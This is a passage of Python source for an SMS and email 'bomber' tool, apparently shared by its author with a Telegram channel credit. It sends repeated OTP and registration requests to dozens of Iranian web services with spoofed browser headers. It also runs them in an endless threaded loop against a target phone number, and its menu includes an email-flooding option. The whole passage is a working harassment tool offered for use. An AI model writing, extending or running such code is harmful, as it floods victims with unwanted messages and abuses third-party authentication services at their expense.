            requests.post(url, json=json_data, headers=headers)
        except:# MadeBy: @Amirprx3
            pass

def ketabrah(phone):
        url = "https://ketabrah.ir/api/v1/auth/register"
        headers = {
            "Host": "ketabrah.ir", "content-length": "22", "accept": "application/json",
            "user-agent": ua.random, "content-type": "application/json", "origin": "https://ketabrah.ir",
            "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty",
            "referer": "https://ketabrah.ir/", "accept-encoding": "gzip, deflate, br",
            "accept-language": "fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7"
        }
        json_data = {"phone": phone}
        try:
            requests.post(url, json=json_data, headers=headers)
        except:
            pass

def alopeyk(phone):
        url = "https://api.alopeyk.com/api/v2/authenticate"
        headers = {
            "Host": "api.alopeyk.com", "content-length": "23", "accept": "application/json",
            "user-agent": ua.random, "content-type": "application/json", "origin": "https://alopeyk.com",
            "sec-fetch-site": "same-site", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty",
            "referer": "https://alopeyk.com/", "accept-encoding": "gzip, deflate, br",
            "accept-language": "fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7"
        }
        json_data = {"mobile": phone}
        try:
            requests.post(url, json=json_data, headers=headers)
        except:
            pass

def okcs(phone):
        url = "https://okcs.com/api/v1/auth/send-otp"
        headers = {
            "Host": "okcs.com", "content-length": "22", "accept": "application/json",
            "user-agent": ua.random, "content-type": "application/json", "origin": "https://okcs.com",
            "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty",
            "referer": "https://okcs.com/", "accept-encoding": "gzip, deflate, br",
            "accept-language": "fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7"
        }
        json_data = {"mobile": phone}
        try:
            requests.post(url, json=json_data, headers=headers)
        except:
            pass

def bitpin(phone):
        url = "https://api.bitpin.ir/v1/usr/send-otp/"
        headers = {
            "Host": "api.bitpin.ir", "content-length": "23", "accept": "application/json",
            "user-agent": ua.random, "content-type": "application/json", "origin": "https://bitpin.ir",
            "sec-fetch-site": "same-site", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty",
            "referer": "https://bitpin.ir/", "accept-encoding": "gzip, deflate, br",
            "accept-language": "fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7"
        }
        json_data = {"phone": phone}
        try:
            requests.post(url, json=json_data, headers=headers)
        except:
            pass

def nobitex(phone):
        url = "https://api.nobitex.ir/auth/send-otp/"
        headers = {
            "Host": "api.nobitex.ir", "content-length": "22", "accept": "application/json",
            "user-agent": ua.random, "content-type": "application/json", "origin": "https://nobitex.ir",
            "sec-fetch-site": "same-site", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty",
            "referer": "https://nobitex.ir/", "accept-encoding": "gzip, deflate, br",
            "accept-language": "fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7"
        }
        json_data = {"mobile": phone}
        try:
            requests.post(url, json=json_data, headers=headers)
        except:
            pass

def wallex(phone):
    url = "https://api.wallex.ir/v1/auth/send-otp"
    headers = {
        "Host": "api.wallex.ir", "content-length": "23", "accept": "application/json",
        "user-agent": ua.random, "content-type": "application/json", "origin": "https://wallex.ir",
        "sec-fetch-site": "same-site", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty",
        "referer": "https://wallex.ir/", "accept-encoding": "gzip, deflate, br",
        "accept-language": "fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7"
    }
    json_data = {"phone": phone}
    try:
        requests.post(url, json=json_data, headers=headers)
    except:
        pass

# Simple VIP function for SMS bombing
def sms_vip(phone, time_delay):
    services = [
        snap, gap, tap30, divar, torob, snapfood, sheypoor, okorosh, alibaba, smarket,
        gapfilm, sTrip, filmnet, drdr, itool, anar, azki, nobat, chmdon, bn,
        lendo, olgoo, pakhsh, didnegar, baskol, kilid, basalam, ghabzino,
        simkhanF, simkhanT, drsaina, binjo, limome, bimito, bimitoVip, seebirani,
        mihanpezeshk, mek, zarrinpal, shahreketab, ketabrah, alopeyk, okcs, bitpin,
        wallex
    ]
    total_services = len(services)
    
    print_slow(f"{p}╔═════[ SMS Bombing Initiated ]═════╗")
    print_slow(f"{g}Target Locked: {y}{phone}")
    print_slow(f"{g}Payloads: {y}{total_services} services")
    print_slow(f"{g}Delay: {y}{time_delay}s")
    print_slow(f"{p}╚═══════════════════════════════════╝")
    sleep(1)
    
    running = True
    try:
        while running:
            for service in services:
                if not running:
                    break
                try:
                    Thread(target=service, args=[phone]).start()
                    sleep(time_delay)
                except Exception as e:
                    print(f"{r}[-] {a}Error in {service.__name__}: {e}")
    except KeyboardInterrupt:
        running = False
        print_slow(f"{g}[+] {y}Mission Completed!")
        system('clear' if name == 'posix' else 'cls')

# Phone number validation
def is_phone(phone: str):
    if match(r"(\+989|^989|09|9)[0-9]{9}", phone):
        return sub(r"(\+989|^989|09)", "+989", phone)# MadeBy: @Amirprx3
    return False

# List of small random bomb ASCII arts
bomb_ascii_arts = [
    # Bomb 1
    f"""
{r}     ______________________________  {y} \  | /  .
{r}    /                            / \ {y} \ \ / /
{r}   |                            |{w}=========={y}-  - -
{r}    \____________________________\_/  {y}/ / \ \ 
{y}                                    .  / | \  .
    """,
    # Bomb 2
    f"""
               {b}    ____
               {b}   '-..-'           {r} .-.
               {b}  ___||___       {r} .-/ /-.
               {b} /_______/|   {r}   / / / /
               {b} |       ||   {r}  / / / /
               {b} |   o   |/   {r} / / / / 
                {b}'----`(--'{w}---{r}/>>=< /
    """,
    # Bomb 3
    f"""
{y}                 _.-^^---....,,--       
               _--                  --_  
              <                        >)
              |                         | 
               \._                   _./  
                  ```--. . , ; .--'''       
                        | |   |             
                     .-=||  | |=-.   
                     `-=#$%&%$#=-'   
                        | ;  :|     
               _____.,-#%&$@%#&#~,._____
    """
]

# Main menu with random bomb ASCII art
def main_menu():
    system('clear' if name == 'posix' else 'cls')
    random_bomb = random.choice(bomb_ascii_arts)
    print_slow(f"""
    {random_bomb}
{p}╔════════════════════════════════════════════════════╗
{b}║              ⟬ Bomber Plus Tool v2.0 ⟭             ║
{p}╚════════════════════════════════════════════════════╝
{y} Info:
    {g}» Coder: {w}@Amirprx3
    {g}» Channel: {w}@Hacker_Plus_main
{y} System:
    {g}» Platform: {w}{System}
    {g}» Node: {w}{Node}
    {g}» Release: {w}{Release}
{p}══════════════════════════════════════════════════════
{w} Choose an Option:
    {g}[1] {y}SMS Bomber
    {g}[2] {y}Email Bomber
    {r}[0] {y}Exit
{p}══════════════════════════════════════════════════════
""")
    choice = input(f"{g}[?] {y}Enter Your Choice (0-2): {a}")
    return choice

# Main execution
def main():
    while True:
        choice = main_menu()
        
        if choice == '1':
            print_slow(f"{g}[+] {y}Starting SMS Bomber!")
            while True:
                phone = is_phone(input(f'{g}[?] {y}Enter Phone Number {g}(+98) {r}- {a}'))
                if phone:
                    break
                print(f"{r}[-] {a}Invalid Phone Number!")
            try:
                Time = float(input(f'{g}[?] {y}Enter Sleep Time Between Requests {g}[Default=0.1] {r}- {a}') or 0.1)
            except ValueError:
                Time = 0.1
                print(f"{g}[0.1] {a}Used")
            print_slow(f"{g}[+] {y}SMS Bomber Running... Press Ctrl+C to Stop!")
            sms_vip(phone, Time)

        elif choice == '2':
            print_slow(f"{g}[+] {y}Initializing Email Bomber!")
            target_email = input(f"{g}[?] {y}Enter Target Email: {a}")
            sender_email = input(f"{g}[?] {y}Enter Your Email: {a}")
            sender_password = input(f"{g}[?] {y}Enter Your Email App Password: {a}")
            try:# MadeBy: @Amirprx3
                count = int(input(f"{g}[?] {y}Enter Number of Emails [Default=10]: {a}") or 10)
                delay = float(input(f"{g}[?] {y}Enter Delay Between Emails (seconds) [Default=0.1]: {a}") or 1.0)
            except ValueError:
                count, delay = 10, 1.0
                print(f"{g}[Default] {a}Using 10 emails with 1.0s delay")
            email_bomber(target_email, sender_email, sender_password, count, delay)

        elif choice == '0':
            print_slow(f"{r}[-] {y}Exiting... Goodbye!")
            break
        
        else:
            print_slow(f"{r}[-] {a}Invalid Choice! Please select 0, 1 or 2.")
            sleep(1)

if __name__ == "__main__":
    main()
# MadeBy: @Amirprx3
